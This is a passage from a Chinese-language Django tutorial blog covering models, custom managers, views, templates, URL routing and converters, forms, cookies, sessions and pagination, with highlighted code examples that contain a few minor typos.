class="number">1999</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">m.author = a</span><br><span class="line">m.save()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改</span></span><br><span class="line">m = MyBookModel.objects.get(<span class="built_in">id</span>=<span class="number">1</span>)</span><br><span class="line">m.title = <span class="string">&quot;Second Book&quot;</span></span><br><span class="line">m.save()</span><br><span class="line"><span class="comment"># 删除</span></span><br><span class="line">m = MyBookModel.objects.get(<span class="built_in">id</span>=<span class="number">1</span>)</span><br><span class="line">m.delete()</span><br></pre></td></tr></table></figure>

<h3 id="自关联"><a href="#自关联" class="headerlink" title="自关联"></a>自关联</h3><p>自关联是一种特殊的一对多关系，例如“省-&gt;市-&gt;县”的关系。<br>设计这种关系，一种方法是设计三张表，利用外键关联三个表；另外一种方法是将他们设计到一张表中，利用一个字段指向其父级ID，这样就形成了自关联的关系。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AreaModel</span>(models.Model):</span><br><span class="line">    title = models.CharField(max_length=<span class="number">100</span>)</span><br><span class="line">    parent = models.ForeignKey(<span class="string">&#x27;self&#x27;</span>, null=<span class="literal">True</span>, blank=<span class="literal">True</span>, on_delete=<span class="literal">False</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.title</span><br></pre></td></tr></table></figure>

<p>on_delete有CASCADE、PROTECT、SET_NULL、SET_DEFAULT、SET()五个可选择的值。</p>
<p>CASCADE：此值设置，是级联删除。<br>PROTECT：此值设置，是会报完整性错误。<br>SET_NULL：此值设置，会把外键设置为null，前提是允许为null。<br>SET_DEFAULT：此值设置，会把设置为外键的默认值。<br>SET()：此值设置，会调用外面的值，可以是一个函数。</p>
<h3 id="管理器-objects"><a href="#管理器-objects" class="headerlink" title="管理器 objects"></a>管理器 objects</h3><p>就是<code>MyBookModel.objects</code>的<code>objects</code>。自制管理器的优势有：</p>
<ul>
<li>改变查询结果</li>
<li>添加个性化方法</li>
</ul>
<p>自制管理器的方式如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AuthorModelManager</span>(models.Manager):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">all</span>(<span class="params">self</span>):</span><br><span class="line">        a = <span class="built_in">super</span>().<span class="built_in">all</span>()</span><br><span class="line">        <span class="keyword">return</span> a.<span class="built_in">filter</span>(age__gt=<span class="number">10</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 此方法与下面的create任选一个：</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_author</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        a = self.model()  <span class="comment"># a = AuthorModel()</span></span><br><span class="line">        a.name = name</span><br><span class="line">        a.age = age</span><br><span class="line">        a.save()</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AuthorModel</span>(models.Model):</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 管理器</span></span><br><span class="line">    objects = AuthorModelManager()</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">cls, name, age</span>):</span><br><span class="line">        a = cls()</span><br><span class="line">        a.name = name</span><br><span class="line">        a.age = age</span><br><span class="line">        a.save()</span><br><span class="line">        <span class="keyword">return</span> a</span><br></pre></td></tr></table></figure>

<p>一旦自制了管理器，原来的管理器就自动失效了（就算名字不是objects，原objects也会失效）。</p>
<h3 id="元选项"><a href="#元选项" class="headerlink" title="元选项"></a>元选项</h3><p>在数据库中，数据表的命名是<code>项目名_模型名</code>，但是一旦项目名发生变化，所有的表的命名都会受到影响。如果消除这种影响，可以在模型类里面定义一个元类：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AuthorModel</span>(models.Model):</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Meta</span>:</span><br><span class="line">        <span class="comment"># 指定表名</span></span><br><span class="line">        db_table = <span class="string">&#x27;author_table&#x27;</span></span><br></pre></td></tr></table></figure>

<p>在某些版本的SQLite中不支持数据表改名，所以这一步操作要注意。</p>
<h3 id="导入导出数据"><a href="#导入导出数据" class="headerlink" title="导入导出数据"></a>导入导出数据</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python manage.py dumpdata &gt; data.json</span><br><span class="line">python manage.py loaddata data.json</span><br></pre></td></tr></table></figure>


<h2 id="Django-视图"><a href="#Django-视图" class="headerlink" title="Django 视图"></a>Django 视图</h2><h3 id="静态视图"><a href="#静态视图" class="headerlink" title="静态视图"></a>静态视图</h3><p>在my_app下创建templates文件夹，在该文件夹下创建index.html，编辑index.html。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>编辑视图函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一种方式，直接返回纯文本</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二种方式，返回模板</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>修改后记着修改对应的urls：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path, include</span><br><span class="line"><span class="keyword">import</span> my_app.views</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;hello&#x27;</span>, my_app.views.hello),</span><br><span class="line">    path(<span class="string">&#x27;index&#x27;</span>, my_app.views.index)</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h3 id="动态视图"><a href="#动态视图" class="headerlink" title="动态视图"></a>动态视图</h3><p>模板系统基本语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">变量标签：&#123;&#123; 变量 &#125;&#125;</span><br><span class="line">for循环标签：&#123;% for x in list %&#125;, &#123;% endfor %&#125;</span><br><span class="line">if-else标签：&#123;% if %&#125;, &#123;% else %&#125;, &#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<p>首先编辑好前端页面，label_list是要输出的标签。这里我们创建books.html文件，编辑如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&#123;% for x in label_list %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123; x.title &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>模板渲染：<br>后台给要输出的标签赋值：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_them</span>(<span class="params">request</span>):</span><br><span class="line">    get_all = MyBookModel.objects.<span class="built_in">all</span>()</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;books.html&#x27;</span>, &#123;</span><br><span class="line">        <span class="string">&#x27;label_list&#x27;</span>: get_all</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>

<p>修改后，别忘了修改urls.py文件。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;index/&#x27;</span>, my_app.views.index),</span><br><span class="line">    path(<span class="string">&#x27;get_books/&#x27;</span>, my_app.views.get_books),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>


<p>如果想自己做一个渲染器，可以这样做：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.template <span class="keyword">import</span> loader, RequestContext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_render</span>(<span class="params">request, template, args</span>):</span><br><span class="line">    temp = loader.get_template(template)</span><br><span class="line">    context = RequestContext(request, args)</span><br><span class="line">    res_html = temp.render(context)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(res_html)</span><br></pre></td></tr></table></figure>


<p><a href="http://127.0.0.1:8080/my_app/index/">http://127.0.0.1:8080/my_app&#x2F;index&#x2F;</a><br><a href="http://127.0.0.1:8080/my_app/get_books/">http://127.0.0.1:8080/my_app&#x2F;get_books&#x2F;</a></p>
<h3 id="依据ID进行路由跳转"><a href="#依据ID进行路由跳转" class="headerlink" title="依据ID进行路由跳转"></a>依据ID进行路由跳转</h3><p>首先建立模板one_book.html：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123; item.title &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123; item.author &#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在my_app的urls里面修改：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">path(<span class="string">&#x27;get_the_book/&lt;int:bid&gt;&#x27;</span>, my_app.views.get_the_book)</span><br></pre></td></tr></table></figure>

<p>相应修改views.py：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_the_book</span>(<span class="params">request, bid</span>):</span><br><span class="line">    bid = <span class="built_in">int</span>(bid)</span><br><span class="line">    get_one = MyBookModel.objects.get(<span class="built_in">id</span>=bid)</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;one_book.html&#x27;</span>, &#123;</span><br><span class="line">        <span class="string">&#x27;item&#x27;</span>: get_one</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>

<p>页面重定向跳转方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">request</span>):</span><br><span class="line">    a = AuthorModel.objects.get(<span class="built_in">id</span>=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    m = MyBookModel()</span><br><span class="line">    m.title = <span class="string">&quot;Second Book&quot;</span></span><br><span class="line">    m.author = a</span><br><span class="line">    m.save()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> HttpResponseRedirect(<span class="string">&#x27;/my_app/index&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="自定义-404-等错误页面"><a href="#自定义-404-等错误页面" class="headerlink" title="自定义 404 等错误页面"></a>自定义 404 等错误页面</h3><p>在项目urls.py中配置：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> django.conf.urls</span><br><span class="line"></span><br><span class="line">django.conf.urls.handler404 = <span class="string">&#x27;my_app.views.error404&#x27;</span></span><br><span class="line">django.conf.urls.handler500 = <span class="string">&#x27;my_app.views.error500&#x27;</span></span><br></pre></td></tr></table></figure>
<p>同时设计相应的错误页面。要查看效果，就要关闭DEBUG模式才可以。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">error404</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;Error handler content&#x27;</span>, status=<span class="number">404</span>)</span><br><span class="line">    <span class="comment"># return render(request, &#x27;error404.html&#x27;, status=404)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error500</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;Error handler content&#x27;</span>, status=<span class="number">500</span>)</span><br></pre></td></tr></table></figure>

<h3 id="管理静态文件"><a href="#管理静态文件" class="headerlink" title="管理静态文件"></a>管理静态文件</h3><p>通常一些静态文件，如网站logo等资源需要单独存放到一个固定的位置，一般是存放到静态文件目录下。<br>配置静态文件目录过程为：</p>
<ol>
<li>确保 INSTALLED_APPS 包含了 django.contrib.staticfiles。</li>
<li>在配置文件中，定义 STATIC_URL，例子:<br><code>STATIC_URL = &#39;/static/&#39;</code></li>
<li>在模板中，用 static 模板标签基于配置 STATICFILES_STORAGE 位给定的相对路径构建 URL。<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% load static %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&#123;% static &#x27;image/example.jpg&#x27; %&#125;&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;My image&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>将你的静态文件保存至程序中名为 static 的目录中。例如 my_app&#x2F;static&#x2F;image&#x2F;example.jpg。</li>
</ol>
<h3 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h3><p>表单的提交常见有两种方式：GET与POST。<br>在Request中包含了浏览器的请求信息，Request的属性包括：</p>
<ul>
<li>POST：POST请求参数，查询字典（QueryDict）类型</li>
<li>GET：GET请求参数，查询字典（QueryDict）类型</li>
<li>FILES：上传的文件，类似于字典的对象</li>
<li>COOKIES：客户端的cookies，一个Python字典</li>
<li>path：表示请求路径，不包括域名与参数</li>
<li>method：表示请求方式</li>
<li>encoding：提交数据的编码，默认utf8</li>
<li>session：服务端session</li>
</ul>
<p>用法如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_author</span>(<span class="params">request</span>):</span><br><span class="line">    args = request.POST</span><br><span class="line">    <span class="comment"># 写法 1：如果没有该参数则返回None</span></span><br><span class="line">    name = args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    name = args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&quot;Anonymous&quot;</span>)  <span class="comment"># 第二个参数表示默认值，即没有参数的时候返回该默认值</span></span><br><span class="line">    name = args.getlist(<span class="string">&#x27;name&#x27;</span>)  <span class="comment"># 返回name参数的多个值，因为允许一个参数含有多个值</span></span><br><span class="line">    <span class="comment"># 写法 2：如果没有该参数则抛出异常KeyError</span></span><br><span class="line">    name = args[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> HttpResponseRedirect(<span class="string">&#x27;/my_app/index&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Ajax-请求"><a href="#Ajax-请求" class="headerlink" title="Ajax 请求"></a>Ajax 请求</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> JsonResponse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_author</span>(<span class="params">request</span>):</span><br><span class="line">    a = AuthorModel.objects.get(<span class="built_in">id</span>=<span class="number">1</span>)</span><br><span class="line">    j = &#123;</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Wang&#x27;</span></span><br><span class="line">        <span class="string">&#x27;age&#x27;</span>: <span class="number">20</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> JsonResponse(j)</span><br></pre></td></tr></table></figure>

<h3 id="Cookie-与-Session"><a href="#Cookie-与-Session" class="headerlink" title="Cookie 与 Session"></a>Cookie 与 Session</h3><p>Cookie：保存在客户端，由服务器生成，客户端访问服务器时会附带Cookies。另外Cookies是会过期的，如果不指定，则有效期为关闭浏览器时。<br>Session：保存在服务端，也是由服务器生成，依赖于Cookie，因为客户标识码SessionID存储在Cookie里面。Session存储位置在数据库中。</p>
<p>Cookie</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置 Cookies</span></span><br><span class="line">response = HttpResponse(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">response.set_cookie(<span class="string">&#x27;num&#x27;</span>, <span class="number">1</span>, max_age=<span class="number">7</span>*<span class="number">24</span>*<span class="number">3600</span>)  <span class="comment"># 从现在开始计算过期时间，单位：秒</span></span><br><span class="line">response.set_cookie(<span class="string">&#x27;num&#x27;</span>, <span class="number">1</span>, expires=timedelta(days=<span class="number">7</span>)+datetime.now())  <span class="comment"># 从指定时间计算，单位：秒</span></span><br><span class="line"><span class="keyword">return</span> response</span><br><span class="line"><span class="comment"># 读取 Cookies</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;num&#x27;</span> <span class="keyword">in</span> request.COOKIES[<span class="string">&#x27;num&#x27;</span>]:</span><br><span class="line">    num = request.COOKIES[<span class="string">&#x27;num&#x27;</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    num = <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>Session</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置 Session</span></span><br><span class="line">request.session[<span class="string">&#x27;num&#x27;</span>] = <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> HttpResponse(<span class="string">&#x27;...&#x27;</span>)</span><br><span class="line"><span class="comment"># 读取 Session</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;num&#x27;</span> <span class="keyword">in</span> request.session[<span class="string">&#x27;num&#x27;</span>]:</span><br><span class="line">    num = request.session[<span class="string">&#x27;num&#x27;</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">num = request.session.get(<span class="string">&#x27;num&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)  <span class="comment"># 也可以设置默认值</span></span><br><span class="line"><span class="comment"># 清除 Session 的值</span></span><br><span class="line">request.session.clear()</span><br><span class="line"><span class="comment"># 删除 Session 记录</span></span><br><span class="line">request.session.flush()</span><br><span class="line"><span class="comment"># 删除 某一个键</span></span><br><span class="line"><span class="keyword">del</span> request.session[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line"><span class="comment"># 设置会话超时时间，单位：秒。默认两周；为0，则关闭浏览器过期</span></span><br><span class="line">request.session.set_expiry(<span class="number">24</span>*<span class="number">3600</span>) </span><br></pre></td></tr></table></figure>

<h3 id="设计分页"><a href="#设计分页" class="headerlink" title="设计分页"></a>设计分页</h3><p>我们也可以使用index?page&#x3D;1的方式传递GET参数，分页也一般采用这种方式查看当前访问的是第几页。通过GET参数获取请求的分页，为了获取GET参数，可以使用如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">page = request.GET.get(<span class="string">&#x27;page&#x27;</span>)  <span class="comment"># 字符串，可能没有这个参数</span></span><br><span class="line"><span class="keyword">if</span> page:</span><br><span class="line">    page = <span class="built_in">int</span>(page)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    page = <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Django自带了分页组件。分页组件及其常用方法如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.core.paginator improt Paginator</span><br><span class="line"></span><br><span class="line">p = Paginator(one_list, <span class="number">3</span>)  <span class="comment"># one_list列表, 每页3个记录</span></span><br><span class="line">p.num_pages  <span class="comment"># 分了几页 </span></span><br><span class="line">p.page_range    <span class="comment"># 总记录数</span></span><br><span class="line"></span><br><span class="line">page = p.page(<span class="number">1</span>)  <span class="comment"># 获取第一页</span></span><br><span class="line">page.number       <span class="comment"># 当前页页码</span></span><br><span class="line">page.object_list  <span class="comment"># 第一页的查询集</span></span><br><span class="line">page.paginator    <span class="comment"># 对应的分页器</span></span><br><span class="line">page.has_next()   <span class="comment"># 是否有下一页</span></span><br><span class="line">page.has_previous()  <span class="comment"># 是否有上一页</span></span><br><span class="line">page.previous_page_number  <span class="comment"># 前一页页码</span></span><br><span class="line">page.next_page_number      <span class="comment"># 后一页页码</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Django-路由"><a href="#Django-路由" class="headerlink" title="Django 路由"></a>Django 路由</h2><h3 id="Path-语法"><a href="#Path-语法" class="headerlink" title="Path 语法"></a>Path 语法</h3><p>Django Path默认支持五个转化器：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">str：匹配除了路径分隔符（/）之外的非空字符串，这是默认的形式</span><br><span class="line">int：匹配正整数，包含0。</span><br><span class="line">slug：匹配字母、数字以及横杠、下划线组成的字符串。</span><br><span class="line">uuid：匹配格式化的uuid，如 075194d3-6885-417e-a8a8-6c931e272f00。</span><br><span class="line">path：匹配任何非空字符串，包含了路径分隔符</span><br></pre></td></tr></table></figure>

<p>具体用法例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;articles/2003/&#x27;</span>, views.special_case_2003),</span><br><span class="line">    path(<span class="string">&#x27;articles/&lt;int:year&gt;/&#x27;</span>, views.year_archive),</span><br><span class="line">    path(<span class="string">&#x27;articles/&lt;int:year&gt;/&lt;int:month&gt;/&#x27;</span>, views.month_archive),</span><br><span class="line">    path(<span class="string">&#x27;articles/&lt;int:year&gt;/&lt;int:month&gt;/&lt;slug&gt;/&#x27;</span>, views.article_detail),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>用户也可以自定义转化器，自定义的转化器需要使用实现转化器接口。实现方法如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 例 1</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IntConverter</span>:</span><br><span class="line">    <span class="comment"># 正则表达式</span></span><br><span class="line">    regex = <span class="string">&#x27;[0-9]+&#x27;</span></span><br><span class="line">    <span class="comment"># value是匹配到的字符串，返回Python变量</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">to_python</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(value)</span><br><span class="line">    <span class="comment"># value是Python变量，返回字符串，用于url反向引用</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">to_url</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(value)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 例 2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StringConverter</span>:</span><br><span class="line">    regex = <span class="string">&#x27;[^/]+&#x27;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">to_python</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">to_url</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"><span class="comment"># 例 3：匹配4位整数</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FourDigitYearConverter</span>:</span><br><span class="line">    regex = <span class="string">&#x27;[0-9]&#123;4&#125;&#x27;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">to_python</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(value)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">to_url</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;%04d&#x27;</span> % value</span><br></pre></td></tr></table></figure>

<p>定义完成后，将其注册到配置中。在需要的urls.py中添加：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> register_converter</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> converters  <span class="comment"># 自制转化器，不嫌乱也可以把自制转化器放到urls.py中。</span></span><br><span class="line"></span><br><span class="line">register_converter(converters.FourDigitYearConverter, <span class="string">&#x27;yyyy&#x27;</span>)</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;articles/&lt;yyyy:year&gt;/&#x27;</span>, views.year_archive),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>


<p>如果嫌自制转化器太繁琐，可以使用兼容Django 1中的正则表达式的方式直接匹配。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;articles/2003/&#x27;</span>, views.special_case_2003),</span><br><span class="line">    re_path(<span class="string">&#x27;articles/(?P&lt;year&gt;[0-9]&#123;4&#125;)/&#x27;</span>, views.year_archive),</span><br><span class="line">    re_path(<span class="string">&#x27;articles/(?P&lt;year&gt;[0-9]&#123;4&#125;)/(?P&lt;month&gt;[0-9]&#123;2&#125;)/&#x27;</span>, views.month_archive),</span><br><span class="line">    re_path(<span class="string">&#x27;articles/(?P&lt;year&gt;[0-9]&#123;4&#125;)/(?P&lt;month&gt;[0-9]&#123;2&#125;)/(?P&lt;slug&gt;[^/]+)/&#x27;</span>, views.article_detail),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="Django-模板"><a href="#Django-模板" class="headerlink" title="Django 模板"></a>Django 模板</h2><h3 id="模板加载顺序"><a href="#模板加载顺序" class="headerlink" title="模板加载顺序"></a>模板加载顺序</h3><p>加载一个模板，首先是查找配置的模板目录，如果找不到，再去INSTALLED_APPS下的templates查找。这一过程是Django自动的。</p>
<h3 id="模板变量"><a href="#模板变量" class="headerlink" title="模板变量"></a>模板变量</h3><p>模板变量，不能以下划线开头。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;&#123; num &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>下面两种情况，有两种解析顺序。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;&#123; author.name &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>其解析顺序为:</p>
<ul>
<li>作为字典，取键值</li>
<li>作为对象，取属性</li>
<li>作为对象，当作对象的方法</li>
<li>都无法匹配，则替换为空字符串</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;&#123; author_list.0 &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>其解析顺序为:</p>
<ul>
<li>作为字典，取键值</li>
<li>作为列表，取下标</li>
<li>都无法匹配，则替换为空字符串</li>
</ul>
